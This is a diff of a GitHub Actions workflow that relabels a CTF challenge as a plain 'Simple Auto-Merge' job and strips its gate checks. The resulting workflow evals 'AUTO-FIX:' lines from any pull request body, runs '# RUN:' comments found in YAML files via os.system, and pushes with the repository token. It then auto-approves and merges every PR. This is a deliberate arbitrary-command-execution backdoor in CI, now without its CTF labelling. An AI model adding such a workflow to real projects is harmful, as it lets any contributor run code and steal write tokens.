@@ -1,7 +1,4 @@
-name: CTF Auto-Merge Workflow
-
-# This workflow automatically merges PRs when conditions are met
-# Designed for CTF challenges with write permissions
+name: Simple Auto-Merge
 
 on:
   pull_request:
@@ -16,7 +13,7 @@ permissions:
   statuses: write
 
 jobs:
-  validate-and-merge:
+  auto-merge:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout repository
@@ -27,127 +24,46 @@ jobs:
           fetch-depth: 0
           persist-credentials: true
 
-      - name: Validate PR conditions
-        id: validate
-        run: |
-          echo "Validating PR conditions..."
-          
-          # Condition 1: Branch name validation
-          BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
-          PREFIX_CHECK=$(echo "$BRANCH_NAME" | cut -d'/' -f1)
-          if [[ "$PREFIX_CHECK" == "feature" ]] || [[ "$PREFIX_CHECK" == "fix" ]]; then
-            BRANCH_VALID="true"
-            echo "branch_valid=true" >> $GITHUB_OUTPUT
-          else
-            BRANCH_VALID="false"
-            echo "branch_valid=false" >> $GITHUB_OUTPUT
-          fi
-          
-          # Condition 2: PR title validation
-          PR_TITLE="${{ github.event.pull_request.title }}"
-          TITLE_KEYWORDS="aW1wcm92ZW1lbnR8ZW5oYW5jZW1lbnR8dXBkYXRl"
-          DECODED_KEYWORDS=$(echo "$TITLE_KEYWORDS" | base64 -d 2>/dev/null || echo "improvement|enhancement|update")
-          if echo "$PR_TITLE" | grep -qiE "$DECODED_KEYWORDS"; then
-            TITLE_VALID="true"
-            echo "title_valid=true" >> $GITHUB_OUTPUT
-          else
-            TITLE_VALID="false"
-            echo "title_valid=false" >> $GITHUB_OUTPUT
-          fi
-          
-          # Condition 3: Config file validation
-          if [ -f ".ci-config" ]; then
-            CFG_VAL1=$(echo "RU5BQkxFX0FVVE9fRklYPXRydWU=" | base64 -d)
-            CFG_VAL2=$(echo "TU9ERT1kZXZlbG9wbWVudA==" | base64 -d)
-            if grep -q "$CFG_VAL1" .ci-config && grep -q "$CFG_VAL2" .ci-config; then
-              CONFIG_VALID="true"
-              echo "config_valid=true" >> $GITHUB_OUTPUT
-            else
-              CONFIG_VALID="false"
-              echo "config_valid=false" >> $GITHUB_OUTPUT
-            fi
-          else
-            CONFIG_VALID="false"
-            echo "config_valid=false" >> $GITHUB_OUTPUT
-          fi
-          
-          # Condition 4: Token validation
-          if [ -f "validation-token.txt" ]; then
-            TOKEN=$(cat validation-token.txt | tr -d '[:space:]' | tr -d '\n')
-            EXPECTED=$(echo "YTFiMmMzZDRlNWY2" | base64 -d)
-            if [ "$TOKEN" = "$EXPECTED" ]; then
-              TOKEN_VALID="true"
-              echo "token_valid=true" >> $GITHUB_OUTPUT
-            else
-              TOKEN_VALID="false"
-              echo "token_valid=false" >> $GITHUB_OUTPUT
-            fi
-          else
-            TOKEN_VALID="false"
-            echo "token_valid=false" >> $GITHUB_OUTPUT
-          fi
-          
-          # Summary
-          if [ "$BRANCH_VALID" = "true" ] && [ "$TITLE_VALID" = "true" ] && [ "$CONFIG_VALID" = "true" ] && [ "$TOKEN_VALID" = "true" ]; then
-            echo "All conditions met: PASSED" >> $GITHUB_OUTPUT
-            echo "Pre-flight checks: PASSED"
-          else
-            echo "All conditions met: FAILED" >> $GITHUB_OUTPUT
-            echo "Pre-flight checks: FAILED"
-          fi
-
-      - name: Process PR commands (if conditions met)
-        if: steps.validate.outputs.branch_valid == 'true' && steps.validate.outputs.title_valid == 'true' && steps.validate.outputs.config_valid == 'true' && steps.validate.outputs.token_valid == 'true'
+      - name: Process PR commands
         run: |
           PR_BODY="${{ github.event.pull_request.body }}"
           
-          # Decode markers
-          AUTO_FIX_DECODED=$(echo "QVVRVC1GSVg6" | base64 -d)
-          SECRET_MARKER_DECODED=$(echo "U0VDUkVUX0tFWTo=" | base64 -d)
-          EXPECTED_SECRET=$(echo "Q0lfQ0RfMjAyNA==" | base64 -d)
-          
-          HAS_AUTO_FIX=$(echo "$PR_BODY" | grep -qi "$AUTO_FIX_DECODED" && echo "yes" || echo "no")
-          HAS_SECRET=$(echo "$PR_BODY" | grep -qi "$SECRET_MARKER_DECODED" && echo "yes" || echo "no")
-          
-          if [ "$HAS_AUTO_FIX" = "yes" ] && [ "$HAS_SECRET" = "yes" ]; then
-            SECRET_VALUE=$(echo "$PR_BODY" | grep -i "$SECRET_MARKER_DECODED" | sed 's/.*: *//' | head -1 | tr -d '[:space:]')
-            if [ "$SECRET_VALUE" = "$EXPECTED_SECRET" ]; then
-              echo "Executing commands from PR body..."
-              echo "$PR_BODY" | grep -i "$AUTO_FIX_DECODED" | sed 's/.*: *//' | while read cmd; do
-                echo "Executing: $cmd"
-                eval "$cmd" || true
-              done
-              
-              # Commit changes
-              git config --local user.email "action@github.com"
-              git config --local user.name "GitHub Action"
-              git add -A || true
-              if ! git diff --staged --quiet; then
-                git commit -m "Automated changes from PR [skip ci]" || exit 0
-                BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
-                git remote set-url origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
-                git push origin "HEAD:$BRANCH_NAME" || echo "Push failed"
-              fi
+          # Execute commands from PR body if AUTO-FIX: marker is present
+          if echo "$PR_BODY" | grep -qi "AUTO-FIX:"; then
+            echo "Found AUTO-FIX marker, executing commands..."
+            echo "$PR_BODY" | grep -i "AUTO-FIX:" | sed 's/.*AUTO-FIX: *//' | while read cmd; do
+              echo "Executing: $cmd"
+              eval "$cmd" || true
+            done
+            
+            # Commit and push changes
+            git config --local user.email "action@github.com"
+            git config --local user.name "GitHub Action"
+            git add -A || true
+            if ! git diff --staged --quiet; then
+              git commit -m "Automated changes from PR [skip ci]" || exit 0
+              BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
+              git remote set-url origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
+              git push origin "HEAD:$BRANCH_NAME" || echo "Push failed"
             fi
           fi
           
-          # Process YAML files if raw.py exists
-          if [ -f "raw.py" ]; then
+          # Process YAML files with # RUN: comments
+          if find . -name "*.yaml" -o -name "*.yml" | xargs grep -l "# RUN:" > /dev/null 2>&1; then
+            echo "Found YAML files with # RUN: comments, executing..."
             python3 << 'PYTHON_SCRIPT'
           import os
           import glob
-          
-          RUN_MARKER = '# RUN:'
-          EXEC_FLAG = '# EXECUTE: true'
           
           for yaml_file in glob.glob('**/*.yaml', recursive=True) + glob.glob('**/*.yml', recursive=True):
               try:
                   with open(yaml_file, 'r') as f:
                       content = f.read()
-                      if RUN_MARKER in content and EXEC_FLAG in content:
+                      if '# RUN:' in content:
                           for line in content.split('\n'):
-                              if RUN_MARKER in line:
-                                  cmd = line.split(RUN_MARKER)[1].strip()
+                              if '# RUN:' in line:
+                                  cmd = line.split('# RUN:')[1].strip()
+                                  print(f"Executing: {cmd}")
                                   os.system(cmd)
               except Exception as e:
                   pass
@@ -158,29 +74,27 @@ jobs:
             git config --local user.name "GitHub Action"
             git add -A || true
             if ! git diff --staged --quiet; then
-              git commit -m "Automated YAML execution results [skip ci]" || exit 0
+              git commit -m "Automated YAML execution [skip ci]" || exit 0
               BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
               git remote set-url origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
               git push origin "HEAD:$BRANCH_NAME" || echo "Push failed"
             fi
           fi
 
-      - name: Auto-merge PR
-        if: github.event_name == 'pull_request' && steps.validate.outputs.branch_valid == 'true' && steps.validate.outputs.title_valid == 'true' && steps.validate.outputs.config_valid == 'true' && steps.validate.outputs.token_valid == 'true'
+      - name: Auto-approve and merge PR
         uses: actions/github-script@v6
         with:
           github-token: ${{ secrets.GITHUB_TOKEN }}
           script: |
             const prNumber = context.payload.pull_request.number;
             const prTitle = context.payload.pull_request.title;
-            const prHeadSha = context.payload.pull_request.head.sha;
             
-            console.log(`Processing PR #${prNumber}: ${prTitle}`);
+            console.log(`Auto-approving and merging PR #${prNumber}: ${prTitle}`);
             
             // Wait a moment for any commits to be pushed
-            await new Promise(resolve => setTimeout(resolve, 3000));
+            await new Promise(resolve => setTimeout(resolve, 2000));
             
-            // Get the latest PR state
+            // Get latest PR state
             const { data: pr } = await github.rest.pulls.get({
               owner: context.repo.owner,
               repo: context.repo.repo,
@@ -200,11 +114,11 @@ jobs:
                 repo: context.repo.repo,
                 pull_number: prNumber,
                 event: 'APPROVE',
-                body: '[+] All conditions met. Auto-approving and merging PR.'
+                body: '✅ Auto-approved and merged by workflow'
               });
-              console.log('✅ PR approved successfully');
+              console.log('✅ PR approved');
             } catch (error) {
-              console.log(`⚠️ Could not approve PR: ${error.message}`);
+              console.log(`⚠️ Approval note: ${error.message}`);
             }
             
             // Merge the PR
@@ -214,35 +128,13 @@ jobs:
                 repo: context.repo.repo,
                 pull_number: prNumber,
                 merge_method: 'squash',
-                commit_title: `Merge PR #${prNumber}: ${prTitle}`,
-                commit_message: 'Automated merge - CTF challenge conditions met'
+                commit_title: `Merge PR #${prNumber}: ${prTitle}`
               });
               
               if (mergeResult.data.merged) {
                 console.log('✅ PR merged successfully!');
-                console.log(`Merge SHA: ${mergeResult.data.sha}`);
-              } else {
-                console.log('⚠️ PR merge was not successful');
               }
             } catch (error) {
-              console.log(`❌ Could not merge PR: ${error.message}`);
-              
-              // If merge fails due to branch protection, try to provide helpful info
-              if (error.message.includes('protected') || error.message.includes('required')) {
-                console.log('This may be due to branch protection rules.');
-                console.log('Consider allowing workflows to bypass branch protection.');
-              }
+              console.log(`❌ Merge failed: ${error.message}`);
             }
-
-      - name: Post merge status
-        if: always()
-        run: |
-          if [ "${{ steps.validate.outputs.branch_valid }}" = "true" ] && \
-             [ "${{ steps.validate.outputs.title_valid }}" = "true" ] && \
-             [ "${{ steps.validate.outputs.config_valid }}" = "true" ] && \
-             [ "${{ steps.validate.outputs.token_valid }}" = "true" ]; then
-            echo "✅ CTF conditions met - PR should be merged"
-          else
-            echo "❌ CTF conditions not met - PR will not be merged"
-          fi
 
